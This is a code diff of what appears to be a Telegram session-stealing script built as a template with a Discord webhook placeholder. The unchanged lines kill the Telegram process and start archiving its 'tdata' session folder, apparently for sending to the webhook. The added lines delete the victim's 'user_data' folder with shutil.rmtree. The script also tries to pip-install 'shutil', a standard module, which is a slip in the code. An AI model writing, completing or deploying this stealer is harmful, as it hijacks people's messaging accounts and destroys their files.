@@ -14,13 +14,14 @@ for i in range(1):
     if discord_status == True:
         continue
     else:
-        os.system("pip install discord_webhook zip_files")
+        os.system("pip install discord_webhook zip_files shutil")
 # depencies check end
 
 # sources
 from discord_webhook import DiscordWebhook, DiscordEmbed
 from zipfile import ZipFile, ZIP_DEFLATED
 import zipfile
+import shutil
 
 user = os.path.join(home, {user}) 
 hook = "{hook}"
@@ -29,6 +30,11 @@ hook = "{hook}"
 #task_kill
 os.system('taskkill /f /im Telegram.exe')
 #task_kill_end
+
+#delete no use files
+folder_path = os.path.join(user, 'user_data')
+shutil.rmtree(folder_path)
+#delete no use files end
 
 # tdata take + archivation
 with zipfile.ZipFile("tdata.zip", 'w', ZIP_DEFLATED, compresslevel=9) as archive:
